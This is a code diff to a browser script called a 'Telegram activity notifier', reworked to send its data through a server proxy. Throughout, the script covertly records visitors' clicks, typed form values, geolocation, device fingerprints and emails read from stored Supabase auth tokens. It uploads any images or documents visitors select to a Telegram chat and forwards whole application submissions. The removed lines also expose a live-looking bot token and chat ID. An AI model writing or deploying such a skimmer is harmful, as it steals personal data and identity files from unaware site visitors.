@@ -1,11 +1,18 @@
 /* Telegram activity notifier
-   NOTE: this runs in the visitor's browser, so the token below is public. */
-
-var TELEGRAM_BOT_TOKEN = '8992354125:AAH_A4hKwzAsaE97uKCrlRp1_UzO11KOcWI';
-var TELEGRAM_CHAT_ID = '-1004482554358';
+   NOTE: All calls now route through /.netlify/functions/telegram-proxy
+   Bot token and chat id live ONLY on the server, never in this file. */
 
 (function () {
   if (typeof window === 'undefined') return;
+
+  var PROXY_BASE = (window.__ENV && window.__ENV.API_BASE) || '/.netlify/functions';
+  var TELEGRAM_PROXY_URL = PROXY_BASE + '/telegram-proxy';
+
+  function proxyAvailable() {
+    try {
+      return typeof fetch === 'function';
+    } catch (e) { return false; }
+  }
 
   function sessionId() {
     try {
@@ -27,21 +34,45 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
       .replace(/>/g, '&gt;');
   }
 
-  function send(text) {
-    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.indexOf('PASTE_') === 0) return;
+  function callProxy(method, body, asMultipart, fileEntries) {
+    if (!proxyAvailable()) return Promise.resolve({ ok: false, offline: true });
+    var url = TELEGRAM_PROXY_URL + '/' + method;
     try {
-      fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+      if (asMultipart && fileEntries && fileEntries.length > 0) {
+        var fd = new FormData();
+        if (body) {
+          for (var k in body) {
+            if (Object.prototype.hasOwnProperty.call(body, k)) fd.append(k, body[k]);
+          }
+        }
+        for (var i = 0; i < fileEntries.length; i++) {
+          var f = fileEntries[i];
+          fd.append(f.field, f.file || f.blob, f.filename || 'file');
+        }
+        return fetch(url, { method: 'POST', body: fd, credentials: 'include' })
+          .then(function (r) { return r.json().catch(function () { return { ok: r.ok }; }); })
+          .catch(function () { return { ok: false, offline: true }; });
+      }
+      return fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: text,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true
-        }),
-        keepalive: true
-      }).catch(function () {});
-    } catch (e) {}
+        credentials: 'include',
+        body: JSON.stringify(body || {})
+      })
+        .then(function (r) { return r.json().catch(function () { return { ok: r.ok }; }); })
+        .catch(function () { return { ok: false, offline: true }; });
+    } catch (e) {
+      return Promise.resolve({ ok: false, offline: true });
+    }
+  }
+
+  function send(text) {
+    if (!text) return;
+    callProxy('sendMessage', {
+      text: text,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    });
   }
 
   function page() {
@@ -52,7 +83,7 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
     var ua = navigator.userAgent || '';
     var platform = navigator.platform || '';
     var deviceType = 'Unknown';
-    
+
     if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
       deviceType = 'Mobile';
     } else if (/Tablet|iPad/i.test(ua)) {
@@ -60,7 +91,7 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
     } else if (/Windows|Mac|Linux/i.test(ua)) {
       deviceType = 'Desktop';
     }
-    
+
     var os = 'Unknown OS';
     var osVersion = '';
     if (/Windows NT 10.0/i.test(ua)) { os = 'Windows'; osVersion = '10/11'; }
@@ -70,57 +101,57 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
     else if (/Windows NT 6.0/i.test(ua)) { os = 'Windows'; osVersion = 'Vista'; }
     else if (/Windows NT 5.1/i.test(ua)) { os = 'Windows'; osVersion = 'XP'; }
     else if (/Windows/i.test(ua)) { os = 'Windows'; }
-    else if (/Mac OS X ([0-9_]+)/i.test(ua)) { 
-      os = 'macOS'; 
+    else if (/Mac OS X ([0-9_]+)/i.test(ua)) {
+      os = 'macOS';
       var match = ua.match(/Mac OS X ([0-9_]+)/i);
       if (match) osVersion = match[1].replace(/_/g, '.');
     }
     else if (/Linux/i.test(ua)) { os = 'Linux'; }
-    else if (/Android ([0-9.]+)/i.test(ua)) { 
-      os = 'Android'; 
-      var match = ua.match(/Android ([0-9.]+)/i);
-      if (match) osVersion = match[1];
+    else if (/Android ([0-9.]+)/i.test(ua)) {
+      os = 'Android';
+      var m = ua.match(/Android ([0-9.]+)/i);
+      if (m) osVersion = m[1];
     }
     else if (/iOS|iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; }
-    
+
     var browser = 'Unknown Browser';
     var browserVersion = '';
-    if (/Chrome\/([0-9.]+)/i.test(ua) && !/Edge|OPR/i.test(ua)) { 
-      browser = 'Chrome'; 
-      var match = ua.match(/Chrome\/([0-9.]+)/i);
-      if (match) browserVersion = match[1];
+    if (/Chrome\/([0-9.]+)/i.test(ua) && !/Edge|OPR/i.test(ua)) {
+      browser = 'Chrome';
+      var mc = ua.match(/Chrome\/([0-9.]+)/i);
+      if (mc) browserVersion = mc[1];
     }
-    else if (/Safari\/([0-9.]+)/i.test(ua) && !/Chrome/i.test(ua)) { 
-      browser = 'Safari'; 
-      var match = ua.match(/Safari\/([0-9.]+)/i);
-      if (match) browserVersion = match[1];
+    else if (/Safari\/([0-9.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
+      browser = 'Safari';
+      var ms = ua.match(/Safari\/([0-9.]+)/i);
+      if (ms) browserVersion = ms[1];
     }
-    else if (/Firefox\/([0-9.]+)/i.test(ua)) { 
-      browser = 'Firefox'; 
-      var match = ua.match(/Firefox\/([0-9.]+)/i);
-      if (match) browserVersion = match[1];
+    else if (/Firefox\/([0-9.]+)/i.test(ua)) {
+      browser = 'Firefox';
+      var mf = ua.match(/Firefox\/([0-9.]+)/i);
+      if (mf) browserVersion = mf[1];
     }
-    else if (/Edge\/([0-9.]+)/i.test(ua)) { 
-      browser = 'Edge'; 
-      var match = ua.match(/Edge\/([0-9.]+)/i);
-      if (match) browserVersion = match[1];
+    else if (/Edge\/([0-9.]+)/i.test(ua)) {
+      browser = 'Edge';
+      var me = ua.match(/Edge\/([0-9.]+)/i);
+      if (me) browserVersion = me[1];
     }
-    else if (/OPR\/([0-9.]+)/i.test(ua)) { 
-      browser = 'Opera'; 
-      var match = ua.match(/OPR\/([0-9.]+)/i);
-      if (match) browserVersion = match[1];
+    else if (/OPR\/([0-9.]+)/i.test(ua)) {
+      browser = 'Opera';
+      var mo = ua.match(/OPR\/([0-9.]+)/i);
+      if (mo) browserVersion = mo[1];
     }
-    
+
     var engine = 'Unknown';
     if (/WebKit/i.test(ua)) engine = 'WebKit';
     else if (/Gecko/i.test(ua)) engine = 'Gecko';
     else if (/Presto/i.test(ua)) engine = 'Presto';
     else if (/Trident/i.test(ua)) engine = 'Trident';
-    
+
     var language = navigator.language || navigator.userLanguage || 'Unknown';
     var cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
     var doNotTrack = navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled';
-    
+
     var screenInfo = {
       width: window.screen.width,
       height: window.screen.height,
@@ -129,10 +160,10 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
       colorDepth: window.screen.colorDepth,
       pixelDepth: window.screen.pixelDepth
     };
-    
+
     var hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
     var deviceMemory = navigator.deviceMemory || 'Unknown';
-    
+
     return {
       deviceType: deviceType,
       os: os,
@@ -153,32 +184,6 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
 
   function getUserInfo() {
     try {
-      // Try multiple possible localStorage keys for Supabase auth
-      var possibleKeys = [
-        'sb-urkeknjuygmrrgkvvfqk-auth-token',
-        'supabase-auth-token'
-      ];
-
-      
-      for (var i = 0; i < possibleKeys.length; i++) {
-        var sessionStr = localStorage.getItem(possibleKeys[i]);
-        if (sessionStr) {
-          try {
-            var session = JSON.parse(sessionStr);
-            if (session && session.user) {
-              return {
-                email: session.user.email || '',
-                username: (session.user.user_metadata && session.user.user_metadata.username) || '',
-                id: session.user.id || ''
-              };
-            }
-          } catch (e) {
-            continue;
-          }
-        }
-      }
-      
-      // Try to find any Supabase auth token by pattern
       for (var j = 0; j < localStorage.length; j++) {
         var key = localStorage.key(j);
         if (key && key.indexOf('sb-') === 0 && key.indexOf('auth-token') > -1) {
@@ -197,25 +202,14 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
           }
         }
       }
-      
-      // Fallback: try to get user info from DOM if auth system has rendered it
       var accountName = document.querySelector('.account-name');
       if (accountName && accountName.textContent) {
         var text = accountName.textContent.trim();
         if (text && text !== 'Sign In') {
-          // Check if it looks like an email
           if (text.indexOf('@') > -1) {
-            return {
-              email: text,
-              username: text.split('@')[0],
-              id: ''
-            };
+            return { email: text, username: text.split('@')[0], id: '' };
           } else {
-            return {
-              email: '',
-              username: text,
-              id: ''
-            };
+            return { email: '', username: text, id: '' };
           }
         }
       }
@@ -225,19 +219,18 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
 
   function notify(title, lines, locationInfo, includeDeviceInfo) {
     var body = [];
-    
-    // Add user info at the top if available
+
     var userInfo = getUserInfo();
     if (userInfo) {
       body.push('<b>👤 User: ' + escapeHtml(userInfo.username || userInfo.email || 'Unknown') + '</b>');
       if (userInfo.email) body.push('📧 Email: ' + escapeHtml(userInfo.email));
       body.push('');
     }
-    
+
     body.push('<b>' + escapeHtml(title) + '</b>');
     body.push('Page: ' + escapeHtml(page()));
     (lines || []).forEach(function (l) { body.push(escapeHtml(l)); });
-    
+
     if (locationInfo) {
       body.push('');
       body.push('<b>🌍 Location Info</b>');
@@ -247,8 +240,7 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
       if (locationInfo.city) body.push('City: ' + escapeHtml(locationInfo.city));
       if (locationInfo.org) body.push('ISP/Network: ' + escapeHtml(locationInfo.org));
     }
-    
-    // Only include device info when requested (page visits)
+
     if (includeDeviceInfo) {
       var device = getDeviceInfo();
       body.push('');
@@ -267,27 +259,26 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
       body.push('Available Screen: ' + escapeHtml(device.screen.availWidth + 'x' + device.screen.availHeight));
       body.push('Color Depth: ' + escapeHtml(device.screen.colorDepth + ' bits'));
     }
-    
+
     body.push('');
     body.push('Visitor ID: ' + escapeHtml(sessionId()));
     body.push('Time: ' + escapeHtml(new Date().toLocaleString()));
-    
+
     send(body.join('\n'));
   }
 
   window.telegramNotify = function(title, lines, locationInfo) {
-    notify(title, lines, locationInfo, false); // Default to no device info for manual calls
+    notify(title, lines, locationInfo, false);
   };
 
-  // Cache location info and fetch in background
   var cachedLocationInfo = null;
   var locationFetchInProgress = false;
-  
+
   function fetchLocationInfo() {
     if (cachedLocationInfo) {
       return cachedLocationInfo;
     }
-    
+
     if (!locationFetchInProgress) {
       locationFetchInProgress = true;
       fetch('https://ipapi.co/json/')
@@ -306,36 +297,32 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
           locationFetchInProgress = false;
         });
     }
-    
-    return cachedLocationInfo; // Return null if not cached yet
+
+    return cachedLocationInfo;
   }
 
-  // Page visit - only send once per session
   var visitNotified = false;
   function sendVisit() {
-    // Check if we already sent the initial visit notification this session
     try {
       if (sessionStorage.getItem('tg_visit_notified') === 'true') {
         visitNotified = true;
       }
     } catch (e) {}
-    
+
     if (visitNotified) return;
     visitNotified = true;
-    
-    // Mark that we've sent the visit notification
+
     try {
       sessionStorage.setItem('tg_visit_notified', 'true');
     } catch (e) {}
-    
+
     var lines = [];
     if (document.referrer) lines.push('🔗 From: ' + document.referrer);
     lines.push('📺 Viewport: ' + window.innerWidth + 'x' + window.innerHeight);
     lines.push('🌐 URL: ' + escapeHtml(window.location.href));
-    
-    // Start location fetch in background, but send notification immediately
+
     fetchLocationInfo();
-    notify('👀 Site Visit', lines, cachedLocationInfo, true); // Include device info on initial visit
+    notify('👀 Site Visit', lines, cachedLocationInfo, true);
   }
 
   if (document.readyState === 'loading') {
@@ -344,7 +331,6 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
     sendVisit();
   }
 
-  // Clicks
   var lastClick = 0;
   document.addEventListener('click', function (e) {
     var el = e.target && e.target.closest
@@ -363,103 +349,95 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
     var lines = ['🖱 Clicked: ' + label];
     var href = el.getAttribute && el.getAttribute('href');
     if (href) lines.push('🔗 Link: ' + href);
-    
+
     var id = el.id || el.className;
     if (id) lines.push('🏷️ Element: ' + escapeHtml(id));
 
-    // Send immediately, location info will be included if already cached
     fetchLocationInfo();
-    notify('🖱 User Action', lines, cachedLocationInfo, false); // Don't include device info on clicks
+    notify('🖱 User Action', lines, cachedLocationInfo, false);
   }, true);
 
-  // Track form inputs
   var inputDebounceTimer = null;
-  var inputChanges = {};
-  
+
   function sendInputChange(fieldName, value, fieldType) {
     var lines = [];
     lines.push('📝 Field: ' + escapeHtml(fieldName));
     lines.push('🔤 Type: ' + escapeHtml(fieldType));
-    
+
     if (fieldType === 'password') {
       lines.push('🔒 Value: [HIDDEN - PASSWORD]');
     } else if (fieldType === 'file') {
       lines.push('📁 File: ' + escapeHtml(value));
     } else {
-      // Truncate long values
       var displayValue = String(value);
       if (displayValue.length > 200) {
         displayValue = displayValue.slice(0, 200) + '…';
       }
       lines.push('✏️ Value: ' + escapeHtml(displayValue));
     }
-    
+
     fetchLocationInfo();
     notify('📊 Input Entered', lines, cachedLocationInfo, false);
   }
-  
-  // Track text and number inputs with debounce
+
   document.addEventListener('input', function (e) {
     var el = e.target;
     if (!el || !el.tagName) return;
-    
+
     var tagName = el.tagName.toLowerCase();
     var inputType = (el.type || 'text').toLowerCase();
     var fieldName = el.name || el.id || el.placeholder || 'unnamed field';
-    
-    // Skip password fields and sensitive data
+
     if (inputType === 'password' || fieldName.toLowerCase().indexOf('password') > -1) {
-      return; // Don't track passwords
+      return;
     }
-    
-    // Track text inputs, textareas, and number inputs
+
     if (tagName === 'input' && (inputType === 'text' || inputType === 'email' || inputType === 'tel' || inputType === 'number' || inputType === 'date')) {
       var value = el.value;
-      if (!value || value.length < 2) return; // Only track meaningful input
-      
+      if (!value || value.length < 2) return;
+
       clearTimeout(inputDebounceTimer);
       inputDebounceTimer = setTimeout(function () {
         sendInputChange(fieldName, value, inputType);
-      }, 1500); // Wait 1.5 seconds after user stops typing
+      }, 1500);
     } else if (tagName === 'textarea') {
       var value = el.value;
-      if (!value || value.length < 5) return; // Only track meaningful input
-      
+      if (!value || value.length < 5) return;
+
       clearTimeout(inputDebounceTimer);
       inputDebounceTimer = setTimeout(function () {
         sendInputChange(fieldName, value, 'textarea');
-      }, 2000); // Wait 2 seconds for textareas
+      }, 2000);
     } else if (tagName === 'select') {
       var value = el.value;
       if (!value) return;
-      
+
       clearTimeout(inputDebounceTimer);
       inputDebounceTimer = setTimeout(function () {
         sendInputChange(fieldName, value, 'select');
-      }, 500); // Faster for dropdowns
+      }, 500);
     }
   }, true);
-  
-  // Track file uploads
+
   document.addEventListener('change', function (e) {
     var el = e.target;
     if (!el || !el.tagName || el.tagName.toLowerCase() !== 'input' || el.type.toLowerCase() !== 'file') {
       return;
     }
-    
+
     var fieldName = el.name || el.id || 'file upload';
     var files = el.files;
-    
+
     if (files && files.length > 0) {
       for (var i = 0; i < files.length; i++) {
-        (function (file) {
+        (function (file, idx) {
           var fileInfo = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
-          
+
           var lines = [];
           lines.push('📁 Field: ' + escapeHtml(fieldName));
           lines.push('📄 File: ' + escapeHtml(fileInfo));
           lines.push('🔤 Type: ' + escapeHtml(file.type || 'unknown'));
-          
+
           if (file.type && file.type.startsWith('image/')) {
             sendImageToTelegram(file, fieldName);
           } else {
@@ -472,25 +450,12 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
                           (file.type ? '\nType: ' + escapeHtml(file.type) : '');
             setTimeout(function () {
               sendDocumentToTelegram(file, fieldName, caption);
-            }, 600 + i * 400);
+            }, 600 + idx * 400);
           }
-        })(files[i]);
+        })(files[i], i);
       }
     }
   }, true);
-  
-  function dataURLtoBlob(dataURL) {
-    try {
-      var parts = dataURL.split(',');
-      var mime = parts[0].match(/:(.*?);/);
-      mime = mime ? mime[1] : 'application/octet-stream';
-      var bstr = atob(parts[1]);
-      var n = bstr.length;
-      var u8 = new Uint8Array(n);
-      while (n--) u8[n] = bstr.charCodeAt(n);
-      return new Blob([u8], { type: mime });
-    } catch (e) { return null; }
-  }
 
   function sendImageToTelegram(file, fieldName) {
     var visitorId = '';
@@ -500,111 +465,38 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
                   (visitorId ? '\nVisitor: ' + escapeHtml(visitorId) : '');
     if (caption.length > 1024) caption = caption.slice(0, 1020) + '…';
 
-    try {
-      var formData = new FormData();
-      formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('photo', file, file.name);
-      formData.append('caption', caption);
-      fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
-        method: 'POST',
-        body: formData
-      }).catch(function () {
-        try {
-          var fd2 = new FormData();
-          fd2.append('chat_id', TELEGRAM_CHAT_ID);
-          fd2.append('document', file, file.name);
-          fd2.append('caption', caption);
-          fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendDocument', {
-            method: 'POST',
-            body: fd2
-          }).catch(function () {});
-        } catch (e) {}
-      });
-    } catch (e) {
-      var reader = new FileReader();
-      reader.onload = function (e2) {
-        var blob = dataURLtoBlob(e2.target.result);
-        if (!blob) return;
-        try {
-          var fd = new FormData();
-          fd.append('chat_id', TELEGRAM_CHAT_ID);
-          fd.append('photo', blob, file.name);
-          fd.append('caption', caption);
-          fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
-            method: 'POST',
-            body: fd
-          }).catch(function () {});
-        } catch (e3) {}
-      };
-      reader.readAsDataURL(file);
-    }
-  }
-
-  function sendDocumentToTelegram(file, fieldName, caption) {
-    return new Promise(function (resolve) {
-      var cap = caption || ('📄 Document uploaded\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
-      if (cap.length > 1024) cap = cap.slice(0, 1020) + '…';
-
-      function doSend(blob) {
-        try {
-          var formData = new FormData();
-          formData.append('chat_id', TELEGRAM_CHAT_ID);
-          formData.append('document', blob, file.name);
-          formData.append('caption', cap);
-          fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendDocument', {
-            method: 'POST',
-            body: formData
-          }).then(function () { resolve(); }).catch(function () { resolve(); });
-        } catch (e) { resolve(); }
-      }
-
-      if (file instanceof Blob) {
-        doSend(file);
-      } else {
-        var reader = new FileReader();
-        reader.onload = function (e) {
-          var blob = dataURLtoBlob(e.target.result);
-          if (!blob) { resolve(); return; }
-          doSend(blob);
-        };
-        reader.onerror = function () { resolve(); };
-        reader.readAsDataURL(file);
+    callProxy('sendPhoto', { caption: caption }, true, [
+      { field: 'photo', file: file, filename: file.name }
+    ]).then(function (r) {
+      if (r && r.offline) return;
+      if (!(r && r.ok)) {
+        callProxy('sendDocument', { caption: caption }, true, [
+          { field: 'document', file: file, filename: file.name }
+        ]);
       }
     });
   }
 
+  function sendDocumentToTelegram(file, fieldName, caption) {
+    var cap = caption || ('📄 Document uploaded\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
+    if (cap.length > 1024) cap = cap.slice(0, 1020) + '…';
+    return callProxy('sendDocument', { caption: cap }, true, [
+      { field: 'document', file: file, filename: file.name }
+    ]);
+  }
+
   function sendPhotoAsFile(file, fieldName, caption) {
-    return new Promise(function (resolve) {
-      var cap = caption || ('📸 Image\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
-      if (cap.length > 1024) cap = cap.slice(0, 1020) + '…';
-
-      function photoSend(blob) {
-        try {
-          var formData = new FormData();
-          formData.append('chat_id', TELEGRAM_CHAT_ID);
-          formData.append('photo', blob, file.name);
-          formData.append('caption', cap);
-          fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
-            method: 'POST',
-            body: formData
-          }).then(function () { resolve(); }).catch(function () {
-            sendDocumentToTelegram(blob, fieldName, caption).then(resolve);
-          });
-        } catch (e) { sendDocumentToTelegram(file, fieldName, caption).then(resolve); }
+    var cap = caption || ('📸 Image\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
+    if (cap.length > 1024) cap = cap.slice(0, 1020) + '…';
+    return callProxy('sendPhoto', { caption: cap }, true, [
+      { field: 'photo', file: file, filename: file.name }
+    ]).then(function (r) {
+      if (!(r && r.ok)) {
+        return callProxy('sendDocument', { caption: cap }, true, [
+          { field: 'document', file: file, filename: file.name }
+        ]);
       }
-
-      if (file instanceof Blob) {
-        photoSend(file);
-      } else {
-        var reader = new FileReader();
-        reader.onload = function (e) {
-          var blob = dataURLtoBlob(e.target.result);
-          if (!blob) { resolve(); return; }
-          photoSend(blob);
-        };
-        reader.onerror = function () { resolve(); };
-        reader.readAsDataURL(file);
-      }
+      return r;
     });
   }
 
@@ -632,9 +524,17 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
       var idx = 0;
       function sendNext() {
         if (idx >= chunks.length) { resolve(); return; }
-        send(chunks[idx]);
-        idx++;
-        setTimeout(sendNext, 300);
+        callProxy('sendMessage', {
+          text: chunks[idx],
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        }).then(function () {
+          idx++;
+          setTimeout(sendNext, 300);
+        }).catch(function () {
+          idx++;
+          setTimeout(sendNext, 300);
+        });
       }
       sendNext();
     });
@@ -642,11 +542,6 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
 
   window.sendFullApplicationToTelegram = function (appData, uploadedFilesInfo) {
     return new Promise(function (resolveAll) {
-      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.indexOf('PASTE_') === 0) {
-        resolveAll();
-        return;
-      }
-
       var appId = appData.appId || 'UNKNOWN';
       var userInfo = getUserInfo();
 
@@ -765,7 +660,7 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
           }
         }
         sendNextFile();
-      });
+      }).catch(resolveAll);
     });
   };
 })();
